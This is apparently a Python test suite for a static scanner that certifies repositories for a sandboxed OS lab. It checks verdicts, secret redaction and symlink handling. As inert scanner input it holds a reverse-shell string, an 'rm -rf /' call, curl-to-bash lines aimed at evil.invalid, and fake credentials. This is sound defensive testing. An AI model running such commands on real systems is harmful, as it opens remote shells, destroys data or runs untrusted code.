"""OS Lab §41/§114/§143 certification checks — zero-framework (mirrors holding/test_registry.py). Run (from backend/):
    PYTHONPATH=backend:. DATABASE_URL=postgresql://u:p@localhost:5432/x python3 -m app.services.holding.os_lab.test_certification
"""
import dataclasses
import hashlib
import json
import os
import re
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[4]))   # backend/ on path so `app` is a package

from app.services.holding.os_lab import certification as c    # noqa: E402
from app.services.holding.os_lab import catalog                # noqa: E402
from app.services.holding.os_lab import runtimes               # noqa: E402  (EXECUTED ledger seam, test-only)
from app.services.holding.os_lab.catalog import Verdict, LabState   # noqa: E402

SRC = Path(c.__file__).read_text()
FIXTURE_TEXT = "\n".join(p.read_text() for p in sorted(c.FIXTURE_DIR.iterdir()) if p.is_file())


def _write(mapping, key, value):      # item assignment as a statement, so _raises() can catch it
    mapping[key] = value


def _inv(files: dict[str, str], **kw) -> c.RepoInventory:
    return c.RepoInventory(name="t", canonical_source="https://example.invalid/t", files=[
        c.InvFile(p, len(s), "d" * 64, s) for p, s in files.items()], **kw)


CLEAN = {"LICENSE": "MIT", "README.md": "# t", "main.c": "int main(void){return 0;}"}
FULL = dict(observed_source="https://example.invalid/t", source_verified_at="2026-09-04T00:00:00Z",
            pinned_sha="a" * 40, license_id="MIT")


def run() -> bool:
    res = []
    def ck(n, ok):
        res.append(bool(ok)); print(f"  [{'PASS' if ok else 'FAIL'}] {n}")

    def _raises(exc, fn):
        try:
            fn()
        except exc:
            return True
        except Exception as ex:                    # wrong exception type is a FAIL, not a pass
            print(f"      (raised {type(ex).__name__}: {ex})")
        return False

    # ── (1) pipeline is typed + ordered ──
    ids = [s.id for s in c.PIPELINE]
    ck("PIPELINE is a tuple of frozen StepDef with unique ids",
       isinstance(c.PIPELINE, tuple) and all(isinstance(s, c.StepDef) for s in c.PIPELINE) and len(set(ids)) == len(ids))
    ck("spec order: canonical_upstream → pin_sha → license → … → obfuscation → build → network → QEMU → monitor → dynamic → artifact",
       ids == ["canonical_upstream", "pin_sha", "license", "file_inventory", "submodules", "git_lfs", "binary_blobs",
               "package_manifests", "install_hooks", "build_scripts", "dockerfiles", "ci_workflows", "shell_scripts",
               "network_destinations", "telemetry", "privileged_ops", "credential_reads", "persistence",
               "downloaded_binaries", "obfuscation", "isolated_build", "restricted_network", "qemu_vm_exec",
               "resource_monitoring", "dynamic_behavior", "artifact_inspection"])
    ck("every STATIC step names an existing pure check; every gated step has none + declares what it observes",
       all(callable(getattr(c, s.check, None)) for s in c.STATIC_STEPS)
       and all(s.check == "" and s.observes for s in c.GATED_STEPS))
    ck("dynamic_behavior observes fs/network/process/persistence/credential",
       set(c.PIPELINE[24].observes) == {"fs_mutations", "network_attempts", "process_tree", "persistence_attempts", "credential_access"})
    ck("StepStatus vocab is exactly PENDING/PASS/FAIL/SKIPPED/UNVERIFIED",
       {s.value for s in c.StepStatus} == {"PENDING", "PASS", "FAIL", "SKIPPED", "UNVERIFIED"})

    # ── (2) report template: everything PENDING + UNVERIFIED until a run ──
    t = c.new_report("x", "https://example.invalid/x")
    ck("new_report() template: every step PENDING, verdict UNVERIFIED, scope NOT_RUN, nothing executed",
       all(s.status == c.StepStatus.PENDING for s in t.steps) and t.verdict == Verdict.UNVERIFIED
       and t.scope == "NOT_RUN" and not any(t.executed.values()) and t.authority_plane == "KAI")

    # ── (3) bounded verdict vocabulary; the forbidden claims are absent from module + fixtures ──
    ck("verdict vocab is exactly the 4 bounded §114 values (reused from catalog.Verdict)",
       {v.value for v in Verdict} == {"NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE", "SUSPICIOUS", "REJECTED", "UNVERIFIED"})
    forbidden = re.compile("MALWARE" + r"[_ -]?FREE|ABSOLUTELY[_ ]?SAFE|VERIFIED[_ ]?SAFE", re.I)
    ck("'MALWARE_FREE' / 'ABSOLUTELY SAFE' literals absent from certification.py and every fixture",
       not forbidden.search(SRC) and not forbidden.search(FIXTURE_TEXT))

    # ── (4) run on the §143 fixture inventory ──
    inv = c.fixture_inventory()
    rep = c.run_static(inv, at="2026-09-04T00:00:00Z")
    ck("fixture inventory read from disk (8 files) — no fetch", len(inv.files) == 8)
    ck("after run: no step PENDING; every step PASS/FAIL/UNVERIFIED/SKIPPED",
       all(s.status != c.StepStatus.PENDING for s in rep.steps))
    ck("every gated (build/network/QEMU/monitor/dynamic/artifact) step is SKIPPED with EXECUTION_GATED — never executed",
       all(rep.step(s.id).status == c.StepStatus.SKIPPED and rep.step(s.id).note == c.EXECUTION_GATED for s in c.GATED_STEPS))
    ck("report.executed says nothing was cloned/downloaded/installed/built/booted/fetched", not any(rep.executed.values()))
    ck("static steps yield PASS + FAIL + UNVERIFIED (canonical/pin/license honestly UNVERIFIED — not fetched)",
       {rep.step(s.id).status for s in c.STATIC_STEPS} == {c.StepStatus.PASS, c.StepStatus.FAIL, c.StepStatus.UNVERIFIED}
       and rep.step("canonical_upstream").status == c.StepStatus.UNVERIFIED == rep.step("pin_sha").status)
    ck("mimic repo verdict is REJECTED (HIGH findings) — bounded, deterministic",
       rep.verdict == Verdict.REJECTED and c.run_static(inv).verdict == Verdict.REJECTED)

    # ── (5) every §143 fixture is flagged AND escalates its step ──
    for fname, step in c.FIXTURE_EXPECT.items():
        sr = rep.step(step)
        hits = [f for f in sr.findings if f.path == fname and f.severity in c.ESCALATES]
        ck(f"§143 fixture {fname} → step {step} FAIL with ≥MEDIUM finding ({hits[0].severity if hits else '-'})",
           sr.status == c.StepStatus.FAIL and hits)
    ck("HIGH-tier fixtures (pipe-to-shell / cred path / persistence) carry HIGH findings",
       all(any(f.severity == "HIGH" and f.path == p for s in rep.steps for f in s.findings)
           for p in ("install.sh", "keyreader.py", "persist.sh")))
    ck("telemetry fixture also escalates the telemetry step",
       rep.step("telemetry").status == c.StepStatus.FAIL and any(f.path == "telemetry.py" for f in rep.step("telemetry").findings))
    ck("fixture hostnames use the reserved .invalid TLD (can never resolve) and shell fixtures exit before the mimic line",
       all(h.endswith(".invalid") for h in rep.step("network_destinations").evidence["hosts"])
       and all((c.FIXTURE_DIR / s).read_text().splitlines()[2] == "exit 0" for s in ("install.sh", "persist.sh")))

    # ── (6) clean inventories: static-only can NEVER reach the clean-scope verdict ──
    r0 = c.run_static(_inv(CLEAN))
    ck("clean inventory w/o pin/origin evidence → no FAIL, verdict UNVERIFIED (never PASS-by-absence)",
       not any(s.status == c.StepStatus.FAIL for s in r0.steps) and r0.verdict == Verdict.UNVERIFIED)
    r1 = c.run_static(_inv(CLEAN, **FULL))
    ck("clean inventory WITH origin+verified_at+sha+license: all STATIC steps PASS, gated SKIPPED → still UNVERIFIED",
       all(r1.step(s.id).status == c.StepStatus.PASS for s in c.STATIC_STEPS) and r1.verdict == Verdict.UNVERIFIED)
    ck("origin mismatch → canonical_upstream FAIL (HIGH) → REJECTED",
       c.run_static(_inv(CLEAN, **{**FULL, "observed_source": "https://example.invalid/other"})).verdict == Verdict.REJECTED)
    ck("origin with .git suffix / trailing slash / case == canonical (no false REJECT)",
       c.run_static(_inv(CLEAN, **{**FULL, "observed_source": "https://Example.invalid/t.git/"})).step("canonical_upstream").status == c.StepStatus.PASS)
    ck("malformed pin (not 40-hex) → FAIL → SUSPICIOUS",
       c.run_static(_inv(CLEAN, **{**FULL, "pinned_sha": "v1.2.3"})).verdict == Verdict.SUSPICIOUS)

    # ── (6b) categorical sweeps are REPO-WIDE: an ordinary source file (not a script) is still caught ──
    # (the strings below are INERT scan input — text the scanner must flag; nothing here is executed)
    rs = c.run_static(_inv({**CLEAN, "net.py": 'CMD = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'}))
    ck("reverse shell string in a .py → network_destinations FAIL (HIGH) → REJECTED",
       rs.step("network_destinations").status == c.StepStatus.FAIL and rs.verdict == Verdict.REJECTED)
    ds = c.run_static(_inv({**CLEAN, "clean.py": 'os.system("rm -rf / ")'}))
    ck("disk-wipe string in a .py → privileged_ops FAIL (HIGH) → REJECTED",
       ds.step("privileged_ops").status == c.StepStatus.FAIL and ds.verdict == Verdict.REJECTED)
    png = c.RepoInventory(name="t", canonical_source="https://example.invalid/t", files=[
        c.InvFile("LICENSE", 3, "d" * 64, "MIT"), c.InvFile("docs/shot.png", 10, "d" * 64, None, True),
        c.InvFile("vendor/tool.so", 10, "d" * 64, None, True)])
    bb = c.run_static(png).step("binary_blobs")
    ck("media binary → LOW (reported, not escalated); executable binary → MEDIUM → step FAIL",
       {f.path: f.severity for f in bb.findings} == {"docs/shot.png": "LOW", "vendor/tool.so": "MEDIUM"} and bb.status == c.StepStatus.FAIL)

    # ── (7) derive_verdict: clean-scope verdict is reachable ONLY when every step (incl. gated) is PASS ──
    allpass = [c.StepResult(s.id, s.title, s.phase.value, c.StepStatus.PASS) for s in c.PIPELINE]
    ck("derive_verdict(all PASS) → NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE",
       c.derive_verdict(allpass) == Verdict.NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE)
    one_skip = [c.StepResult(s.id, s.title, s.phase.value, c.StepStatus.SKIPPED if s.id == "qemu_vm_exec" else c.StepStatus.PASS) for s in c.PIPELINE]
    ck("one SKIPPED gated step → UNVERIFIED", c.derive_verdict(one_skip) == Verdict.UNVERIFIED)
    med = [c.StepResult("x", "x", "STATIC", c.StepStatus.FAIL, [c.Finding("x", "MEDIUM", "p", "d")])]
    hi = [c.StepResult("x", "x", "STATIC", c.StepStatus.FAIL, [c.Finding("x", "HIGH", "p", "d")])]
    ck("MEDIUM FAIL → SUSPICIOUS; HIGH → REJECTED; empty → UNVERIFIED",
       c.derive_verdict(med) == Verdict.SUSPICIOUS and c.derive_verdict(hi) == Verdict.REJECTED and c.derive_verdict([]) == Verdict.UNVERIFIED)

    # ── (8) no clone/build/QEMU/network capability in the module ──
    banned = re.compile(r"^\s*(?:import|from)\s+(?:subprocess|socket|urllib|http|requests|httpx|shutil|git|dulwich|pexpect|asyncio\.subprocess)\b", re.M)
    ck("no subprocess/socket/urllib/http/requests/git import in certification.py",
       not banned.search(SRC) and "os.system" not in SRC and "qemu-system" not in SRC and "git clone" not in SRC)
    ck("inventory_from_dir reads only (no write/mkdir/unlink/chmod calls)",
       not re.search(r"\.(?:write_text|write_bytes|mkdir|unlink|rename|chmod|rmtree)\(", SRC) and "open(" not in SRC.replace("finditer(", ""))

    # ── (9) secrets in a scanned file never leak into the report ──
    leak = c.run_static(_inv({**CLEAN, "cfg.py": 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"'}))
    js = c.to_json(leak)
    ck("AWS key in a scanned file is flagged at the core table's severity (MEDIUM → credential_reads FAIL → SUSPICIOUS) "
       "but the key never appears in the JSON report (H1: no snippet at all — the match IS the secret)",
       leak.verdict == Verdict.SUSPICIOUS and leak.step("credential_reads").status == c.StepStatus.FAIL
       and "AKIAIOSFODNN7EXAMPLE" not in js
       and all("withheld" in f.detail for f in leak.step("credential_reads").findings))
    ck("report is plain-JSON serializable with per-severity counts", isinstance(json.loads(js)["findings_by_severity"], dict))

    # ── (9b) H1: when the MATCH IS the secret, no snippet is emitted at all (truncation can't leak a prefix) ──
    # (inert scan input: a shape-valid AWS STS key id that was never issued, and a 120-char secret value)
    # M2 round 4: the two defects are scanned SEPARATELY — together, the MEDIUM AWS-key row masked the fact
    # that the LOW 'Hardcoded credential candidate' row alone left credential_reads PASS.
    ASIA_ID = "ASIA" + "Q7WZ3KLMNPRSTUVX"
    LONG_SECRET = "z9Q" * 40                       # 120 chars: the closing quote fell past the old 100-char cut
    id_only = c.run_static(_inv({**CLEAN, "cfg2.py": f'AWS_ID = "{ASIA_ID}"\n'}))
    id_js, cr2 = c.to_json(id_only), id_only.step("credential_reads")
    ck("H1/M2: a key id ALONE → credential_reads FAIL with one path+line+label finding; the key id appears "
       "nowhere in the JSON report",
       cr2.status == c.StepStatus.FAIL and {f.path for f in cr2.findings} == {"cfg2.py"} and len(cr2.findings) == 1
       and all(f.line > 0 and "withheld" in f.detail for f in cr2.findings)
       and ASIA_ID not in id_js and "AROA" not in id_js)
    val_only = c.run_static(_inv({**CLEAN, "cfg3.py": f'secret = "{LONG_SECRET}"\n'}))
    val_js, cr3 = c.to_json(val_only), val_only.step("credential_reads")
    ck("M2: a 120-char hardcoded secret ALONE (core rates it LOW) is FLOORED to MEDIUM so credential_reads "
       "FAILs → SUSPICIOUS — an embedded credential can never yield an all-PASS static pipeline; the value "
       "and every 20-char window of it stay out of the JSON report",
       cr3.status == c.StepStatus.FAIL and val_only.verdict == Verdict.SUSPICIOUS
       and {f.path for f in cr3.findings} == {"cfg3.py"} and len(cr3.findings) == 1
       and all(f.severity in c.ESCALATES and f.line > 0 and "withheld" in f.detail for f in cr3.findings)
       and not any(LONG_SECRET[i:i + 20] in val_js for i in range(len(LONG_SECRET) - 19))
       and not any(s.status == c.StepStatus.PASS and s.id == "credential_reads" for s in val_only.steps))
    # ── (9b-2) round 5: flooring the SEVERITY did nothing for a credential core never MATCHED at all. Each of
    # these families left credential_reads PASS while the code and the doc claimed "an embedded credential can
    # never leave it PASS" — a false claim. Each must now FAIL, with no window of the secret in the report.
    _FAMILIES = {
        "github_pat":  ('GITHUB_TOKEN = "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"', "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"),
        "github_bare": ("ghp_Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3h2", "ghp_Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3h2"),
        "bearer":      ("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.aaaaaaaaaaaaaaaaaaaaaaaa", "eyJhbGciOiJIUzI1NiJ9.aaaaaaaaaaaaaaaaaaaaaaaa"),
        "slack":       ('SLACK_TOKEN = "xoxb-1234567890-abcdefghijklmno"', "xoxb-1234567890-abcdefghijklmno"),
        "openai":      ('key = "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4"', "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4"),
        "gitlab":      ("glpat-A1b2C3d4E5f6G7h8I9j0", "glpat-A1b2C3d4E5f6G7h8I9j0"),
        "url_cred":    ("url = https://user:SuperSecretPw@evil.invalid/x.git", "SuperSecretPw"),
    }
    for _fam, (_body, _secret) in _FAMILIES.items():
        _rep = c.run_static(_inv({**CLEAN, "deploy.py": _body + "\n"}))
        _st, _js = _rep.step("credential_reads"), c.to_json(_rep)
        _w = min(20, len(_secret))
        ck(f"round 5: an embedded {_fam} credential FAILs credential_reads (it PASSed before — the claim was "
           f"false) and no window of it reaches the JSON report",
           _st.status == c.StepStatus.FAIL and _st.findings
           and all(f.line > 0 and f.path == "deploy.py" for f in _st.findings)
           and not any(_secret[i:i + _w] in _js for i in range(len(_secret) - _w + 1)))

    sec = c.run_static(_inv({**CLEAN, "cfg2.py": f'AWS_ID = "{ASIA_ID}"\nsecret = "{LONG_SECRET}"\n'}))
    sec_js = c.to_json(sec)
    ck("H1: both together → 2 findings, still path + line + label only, neither value in the JSON report",
       sec.step("credential_reads").status == c.StepStatus.FAIL and len(sec.step("credential_reads").findings) == 2
       and ASIA_ID not in sec_js and LONG_SECRET[:20] not in sec_js)
    ck("H1: task_resolver.redact itself now knows ASIA/AROA key ids (not just AKIA)",
       "[REDACTED]" == c.redact(ASIA_ID) == c.redact("AROA" + "Q7WZ3KLMNPRSTUVX") == c.redact("AKIAIOSFODNN7EXAMPLE"))
    e5 = catalog.get("Nanos", catalog.initial_catalog())
    with runtimes.simulated_ledger(build=True, qemu_boot=True):   # TEST-ONLY seam: simulate a later phase's ledger
        for st, evd in ((LabState.SOURCE_VERIFIED, {"verified_at": "T"}), (LabState.PINNED, {"sha": "c" * 40}),
                        (LabState.QUARANTINED, {"p": 1}), (LabState.STATIC_REVIEW, {"p": 1}),
                        (LabState.BUILD_REVIEW, {"p": 1}), (LabState.ISOLATED_EXECUTION, {"p": 1}),
                        (LabState.SECURITY_REVIEW, {"p": 1})):
            catalog.advance(e5, st, actor="operator", reason="t", evidence=evd)
    catalog.record_verdict(e5, Verdict.SUSPICIOUS, actor="kai", reason="secret material", evidence=sec.to_dict())
    hist = json.dumps(e5.history, default=str)
    ck("H1: the same report recorded as audited catalog evidence leaks neither the key id nor the secret value "
       "(and the EXECUTED ledger is restored)",
       e5.certification == Verdict.SUSPICIOUS and ASIA_ID not in hist and LONG_SECRET[:20] not in hist
       and not any(runtimes.EXECUTED.values()))

    # ── (9c) H1 round 3: the snippet is bounded by MATCH LENGTH, not by the label ──
    # (inert scan input: a CUSTOM auth header whose value redact()'s fixed header-name list cannot know,
    #  sitting INSIDE a greedy line-spanning match — the download row and the core pipe-to-shell row)
    CUSTOM = "K7m" * 40                              # 120 chars → 101 distinct 20-char windows
    dl = c.run_static(_inv({**CLEAN, "get.sh": f'curl -H "X-Custom-Auth: {CUSTOM}" https://cdn.evil.invalid/x.tar.gz\n'
                                               f'curl -sS "https://cdn.evil.invalid/i.sh?t={CUSTOM}" | bash\n'}))
    dl_js = c.to_json(dl)
    db = dl.step("downloaded_binaries")
    ck("H1: a greedy match that CONTAINS a custom-auth secret (curl…archive, curl…|bash) emits NO snippet — "
       "not one of the 101 20-char windows of the secret reaches the JSON report — while the step still FAILs "
       "with path + line + label",
       not any(CUSTOM[i:i + 20] in dl_js for i in range(len(CUSTOM) - 19))
       and db.status == c.StepStatus.FAIL and {f.path for f in db.findings} == {"get.sh"} and len(db.findings) >= 2
       and all(f.line > 0 and "withheld" in f.detail for f in db.findings) and dl.verdict == Verdict.REJECTED)
    ck("H1: the bound is match LENGTH, not blanket withholding — a short match still carries its redacted snippet",
       any("…" in f.detail for f in c.run_static(_inv({**CLEAN, "t.py": "x = telemetry\n"})).step("telemetry").findings)
       and c._MAX_MATCH <= 40)

    # ── (9e) M3 round 4: a SHORT match now carries the MATCH ALONE — the 20-char PRE-context is gone ──
    # (inert scan input: a 42-char token redact() cannot know, sitting immediately before a short match)
    PRE = "Q7w" * 14
    m3 = c.run_static(_inv({**CLEAN, "pre.py": f"auth {PRE} telemetry\n"}))
    m3_js, tf = c.to_json(m3), m3.step("telemetry").findings
    ck("M3: an unredactable token ABUTTING a short match contributes NOTHING to the snippet — not one 6-char "
       "window of it reaches the JSON report; the finding is label + the matched text and nothing else",
       tf and all(f.line > 0 for f in tf)
       and not any(PRE[i:i + 6] in m3_js for i in range(len(PRE) - 5))
       and any(f.detail == "telemetry: …telemetry…" for f in tf))

    # ── (9d) H1 round 4: a .gitmodules URL can EMBED a credential. The finding text was redacted but the
    #        step's EVIDENCE carried the URL verbatim into the JSON artifact and the audited history.
    #        (inert scan input: a password inside a submodule URL — nothing connects to anything)
    GM_PW = "Sup3rSecretPw" + "Q7wZ3kLmNpRs"          # 25 chars → real 20-char windows to hunt for
    GM_TEXT = ('[submodule "a"]\n'                     # url on line 2
               f'\turl = https://u:{GM_PW}@evil.invalid/a.git\n'
               '[submodule "b"]\n'                     # url on line 4
               '\turl = https://example.invalid/b.git\n')
    gm = c.run_static(_inv({**CLEAN, ".gitmodules": GM_TEXT}))
    sm = gm.step("submodules")
    gm_ev, gm_js = sm.evidence, c.to_json(gm)
    catalog.record_verdict(e5, Verdict.SUSPICIOUS, actor="kai", reason="submodule urls",
                           evidence={"submodules": gm_ev})
    ck("H1: the submodule password appears NOWHERE — not one of its 20-char windows is in the JSON report, "
       "and it is absent from evidence['urls'], the finding text, and the append-only catalog history",
       not any(GM_PW[i:i + 20] in gm_js for i in range(len(GM_PW) - 19))
       and GM_PW not in json.dumps(gm_ev) and gm_ev["urls"][0] == "[REDACTED]"
       and not any(GM_PW in f.detail for f in sm.findings)
       and GM_PW not in json.dumps(e5.history, default=str))
    ck("H1: the step still refuses to PASS (UNVERIFIED — each submodule is a separate, uncertified supply "
       "chain), both URLs are still reported, and each finding carries a REAL line number (2 and 4, not 0)",
       sm.status == c.StepStatus.UNVERIFIED and len(sm.findings) == 2 and [f.line for f in sm.findings] == [2, 4]
       and gm_ev["urls"][1] == "https://example.invalid/b.git")
    ck("H1: defence in depth — StepResult REDACTS evidence where it is BUILT, so no future step can leak raw "
       "scanned text through the same door (to_dict/history copy evidence straight out)",
       c.StepResult("x", "x", "STATIC", evidence={"note": "password=hunter2hunter2",
                                                  "u": ["https://a:pw123456@h/x"]}).evidence
       == {"note": "[REDACTED]", "u": ["[REDACTED]"]})
    ck("H3: the frozen mappings are real dict SUBCLASSES, so task_resolver.redact still traverses them "
       "(a MappingProxyType would have been walked straight past, unredacted)",
       isinstance(gm_ev, dict) and isinstance(c._Frozen({"api_key": "sk-abcdefghijklmnopqrst"}), dict)
       and c.redact(c._Frozen({"api_key": "sk-abcdefghijklmnopqrst"}))["api_key"] == "[REDACTED]")
    ck("H3: the freeze still holds (every mutating method raises TypeError), the honesty ledger stays False, "
       "and dataclasses.asdict(report) now SUCCEEDS",
       all(_raises(TypeError, fn) for fn in (lambda: _write(gm_ev, "urls", []), lambda: gm_ev.update(urls=[]),
                                             lambda: gm_ev.pop("urls"), lambda: gm_ev.clear(),
                                             lambda: gm_ev.setdefault("x", 1), lambda: gm.executed.pop("build"),
                                             lambda: _write(gm.executed, "build", True)))
       and gm.executed["build"] is False and not any(gm.executed.values())
       and dataclasses.asdict(gm)["executed"]["build"] is False
       and dataclasses.asdict(gm)["steps"][0]["status"] is c.StepStatus.UNVERIFIED)

    # ── (10) coordination with catalog.py: the report is evidence for the §113 lifecycle, never an authority ──
    e = catalog.get("virtme-ng", catalog.initial_catalog())
    catalog.advance(e, LabState.SOURCE_VERIFIED, actor="operator", reason="t", evidence={"verified_at": "t"})
    catalog.advance(e, LabState.PINNED, actor="operator", reason="t", evidence={"sha": "b" * 40})
    catalog.advance(e, LabState.QUARANTINED, actor="operator", reason="t", evidence={"path": "local"})
    catalog.advance(e, LabState.STATIC_REVIEW, actor="operator", reason="t", evidence={"started": True})
    rec = catalog.advance(e, LabState.REJECTED, actor="kai", reason="static cert REJECTED", evidence=rep.to_dict())
    ck("a REJECTED static report drives STATIC_REVIEW → REJECTED via catalog.advance (audited, evidence = report)",
       e.state == LabState.REJECTED and rec["evidence"]["verdict"] == "REJECTED" and e.certification == Verdict.UNVERIFIED)
    CLEAN_V = Verdict.NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE
    ck("record_verdict refused outside SECURITY_REVIEW even for the operator with a real report (the report cannot self-certify)",
       _raises(ValueError, lambda: catalog.record_verdict(e, CLEAN_V, actor="operator", reason="t", evidence=r1.to_dict()))
       and e.certification == Verdict.UNVERIFIED)
    ck("H1: kai may never record the clean-scope verdict — PermissionError before any other check, even with a real report",
       _raises(PermissionError, lambda: catalog.record_verdict(e, CLEAN_V, actor="kai", reason="t", evidence=r1.to_dict()))
       and e.certification == Verdict.UNVERIFIED)

    # ── (11) H1: reports and their steps are FROZEN — a STATIC_ONLY report cannot be flipped to FULL/PASS in place ──
    ck("H1: CertificationReport + StepResult are frozen dataclasses; steps is a tuple",
       isinstance(rep.steps, tuple) and all(isinstance(s, c.StepResult) for s in rep.steps)
       and _raises(dataclasses.FrozenInstanceError, lambda: setattr(rep, "scope", "FULL"))
       and _raises(dataclasses.FrozenInstanceError, lambda: setattr(rep, "verdict", CLEAN_V))
       and _raises(dataclasses.FrozenInstanceError, lambda: setattr(rep.step("qemu_vm_exec"), "status", c.StepStatus.PASS))
       and _raises(AttributeError, lambda: rep.steps.append(None))
       and rep.scope == "STATIC_ONLY" and rep.verdict == Verdict.REJECTED
       and rep.step("qemu_vm_exec").status == c.StepStatus.SKIPPED)
    ck("L1: the freeze is DEEP — executed[] and a step's evidence[] are mutation-refusing dict subclasses: "
       "in-place mutation raises TypeError and the honesty ledger stays False",
       _raises(TypeError, lambda: _write(rep.executed, "build", True))
       and _raises(TypeError, lambda: _write(rep.step("file_inventory").evidence, "files", 0))
       and rep.executed["build"] is False and not any(rep.executed.values())
       and json.loads(c.to_json(rep))["executed"]["build"] is False)

    # ── (12) M2/M3: inventory_from_dir follows nothing, opens only what it hashes fully, reports what it skipped ──
    # (tempfile/os/chmod live in THIS test only — the AST/regex scans over the non-test modules stay clean)
    with tempfile.TemporaryDirectory() as td:
        root, outside = Path(td) / "repo", Path(td) / "outside"
        root.mkdir(); outside.mkdir(); (root / ".aws").mkdir(); (root / "secrets").mkdir()
        (outside / "leak.txt").write_text("OUTSIDE_SECRET_ZZ9")
        (root / "LICENSE").write_text("MIT")
        (root / "main.c").write_text("int main(void){return 0;}")
        os.symlink(outside / "leak.txt", root / "linkfile")             # file symlink → target outside the root
        os.symlink(outside, root / "linkdir")                            # dir symlink → target outside the root
        (root / ".env").write_text("DB_PASSWORD=FORBIDDEN_BODY_QQ7")     # §30 forbidden AND a dotfile
        (root / ".aws" / "credentials").write_text("aws_secret_access_key = FORBIDDEN_BODY_AWS8")
        (root / "secrets" / "token.txt").write_text("FORBIDDEN_BODY_TOK5")
        (root / "server.pem").write_text("FORBIDDEN_BODY_PEM4")
        (root / "NOTES.md").write_text("see key:\n-----BEGIN OPENSSH PRIVATE KEY-----\nKEYBODY_OPENSSH_ABC123\n-----END OPENSSH PRIVATE KEY-----\n")
        (root / "howto.txt").write_text("-----BEGIN RSA PRIVATE KEY-----\nKEYBODY_RSA_QWERTY987\n-----END RSA PRIVATE KEY-----\n")
        (root / "tele.py").write_text("x = telemetry  # POSTMATCH_TAIL_WORD\n")
        exact = b"\0" + b"x" * (c._MAX_READ - 1)                          # == _MAX_READ → opened, hashed fully (binary)
        (root / "exact.dat").write_bytes(exact)
        (root / "huge.dat").write_bytes(b"y" * (c._MAX_READ + 1))        # > _MAX_READ → stat only
        os.chmod(root / "huge.dat", 0)                                   # unreadable: any open() would raise
        try:
            inv = c.inventory_from_dir(root, name="t", canonical_source="https://example.invalid/t")
            capped = c.inventory_from_dir(root, name="t", canonical_source="https://example.invalid/t", max_files=2)
        finally:
            os.chmod(root / "huge.dat", 0o600)
        by = {f.path: f for f in inv.files}
        rep2 = c.run_static(inv)
        js2 = c.to_json(rep2)
        fi = rep2.step("file_inventory")
        ck("M2: symlinks (file + dir) are recorded with content '' / sha256 None / skipped='symlink' and NEVER followed",
           all(p in by and by[p].content == "" and by[p].sha256 is None and by[p].skipped == "symlink" for p in ("linkfile", "linkdir"))
           and "OUTSIDE_SECRET_ZZ9" not in js2 and not any("OUTSIDE_SECRET_ZZ9" in (f.content or "") for f in inv.files)
           and not any(f.path.startswith("linkdir/") for f in inv.files))
        ck("M2: check_file_inventory → UNVERIFIED with a 'symlink not followed' finding per symlink",
           fi.status == c.StepStatus.UNVERIFIED
           and {f.path for f in fi.findings if "symlink not followed" in f.detail} == {"linkfile", "linkdir"})
        ck("M2: every path resolves under the root (guard present; rglob never descends a symlinked dir here)",
           "is_relative_to(r)" in SRC and "resolves outside the root" in SRC)
        ck("M2: §30 forbidden targets (.env / .aws/credentials / secrets/ / *.pem) are recorded, NOT opened, NOT hidden by the dotfile filter",
           all(p in by and by[p].skipped == "forbidden" and by[p].content is None and by[p].sha256 is None and by[p].size > 0
               for p in (".env", ".aws/credentials", "secrets/token.txt", "server.pem"))
           and not any(b in js2 for b in ("FORBIDDEN_BODY_QQ7", "FORBIDDEN_BODY_AWS8", "FORBIDDEN_BODY_TOK5", "FORBIDDEN_BODY_PEM4")))
        cr = rep2.step("credential_reads")
        ck("M2: each forbidden target yields a credential_reads MEDIUM 'shipped in the repo (§30) — not opened' finding → step FAIL",
           cr.status == c.StepStatus.FAIL
           and {f.path for f in cr.findings if "not opened" in f.detail} == {".env", ".aws/credentials", "secrets/token.txt", "server.pem"})
        ck("M2: private-key material in a .md and a .txt (doc extensions) is still flagged — key bodies never reach the report",
           {"NOTES.md", "howto.txt"} <= {f.path for f in cr.findings}
           and "KEYBODY_OPENSSH_ABC123" not in js2 and "KEYBODY_RSA_QWERTY987" not in js2)
        ck("M2: a finding snippet carries NOTHING after the match (0 post-match chars)",
           any(f.path == "tele.py" for f in rep2.step("telemetry").findings) and "POSTMATCH_TAIL_WORD" not in js2)
        ck("M3: a file of exactly _MAX_READ bytes is read + hashed FULLY (digest of the whole content, not a prefix)",
           by["exact.dat"].sha256 == hashlib.sha256(exact).hexdigest() and by["exact.dat"].size == c._MAX_READ
           and by["exact.dat"].skipped == "" and by["exact.dat"].is_binary)
        ck("M3: a file > _MAX_READ is NOT opened (unreadable file raised nothing): size recorded, sha256 None, skipped='truncated'",
           by["huge.dat"].size == c._MAX_READ + 1 and by["huge.dat"].sha256 is None and by["huge.dat"].content is None
           and by["huge.dat"].skipped == "truncated")
        ck("M3: oversize → file_inventory UNVERIFIED finding + binary_blobs MEDIUM 'oversize' finding (step FAIL); no prefix digest anywhere",
           any(f.path == "huge.dat" and "not opened" in f.detail for f in fi.findings)
           and any(f.path == "huge.dat" and f.severity == "MEDIUM" and "oversize" in f.detail for f in rep2.step("binary_blobs").findings)
           and rep2.step("binary_blobs").status == c.StepStatus.FAIL
           and all(f.sha256 is None or len(f.sha256) == 64 for f in inv.files))
        ck("M3: rglob is consumed lazily (no sorted() over the generator); max_files caps the walk; result sorted afterwards",
           "sorted(r.rglob" not in SRC and "sorted(Path(root)" not in SRC and len(capped.files) == 2
           and [f.path for f in inv.files] == sorted(f.path for f in inv.files))
        cap_fi = c.run_static(capped).step("file_inventory")
        ck("M2: a walk that hits max_files records walk_truncated/files_seen, and check_file_inventory refuses "
           "to PASS a truncated inventory (UNVERIFIED + MEDIUM 'walk capped'); the uncapped walk is untruncated",
